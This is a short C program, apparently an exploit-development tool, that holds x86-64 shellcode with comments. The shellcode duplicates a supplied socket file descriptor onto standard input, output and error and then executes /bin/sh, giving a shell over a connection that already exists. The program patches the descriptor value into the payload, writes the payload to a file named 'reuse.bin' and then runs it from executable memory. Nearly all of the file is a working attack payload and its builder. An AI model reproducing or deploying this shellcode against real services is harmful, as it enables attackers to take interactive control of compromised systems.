#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

unsigned char shellcode[] =
    "\x48\x31\xff"                 // xor rdi, rdi
    "\x40\xb7\x00"                 // mov dil, 0x00  <- shellcode[5] патчиться fd
    "\x48\x31\xf6"                 // xor rsi, rsi
    "\x6a\x21\x58\x0f\x05"         // dup2(fd, 0)
    "\x48\xff\xc6\x6a\x21\x58\x0f\x05" // dup2(fd, 1)
    "\x48\xff\xc6\x6a\x21\x58\x0f\x05" // dup2(fd, 2)
    "\x48\x31\xd2\x52"
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00" // "/bin/sh"
    "\x50\x48\x89\xe7\x52\x57\x48\x89\xe6"
    "\x6a\x3b\x58"                 // push 0x3b; pop rax
    "\x0f\x05";                    // syscall

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <fd>\n", argv[0]);
        return 1;
    }
    int fd = atoi(argv[1]);
    fprintf(stderr, "[DEBUG] Received FD: %d\n", fd);
    if (fd < 0 || fd > 255) {
        fprintf(stderr, "Invalid FD: %d\n", fd);
        return 1;
    }
    shellcode[5] = (unsigned char)fd;
    fprintf(stderr, "[DEBUG] Patched shellcode[5] with fd = 0x%02x\n", shellcode[5]);

    int fd_out = open("reuse.bin", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    write(fd_out, shellcode, sizeof(shellcode));
    close(fd_out);

    void *mem = mmap(NULL, sizeof(shellcode),
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
    return 0;
}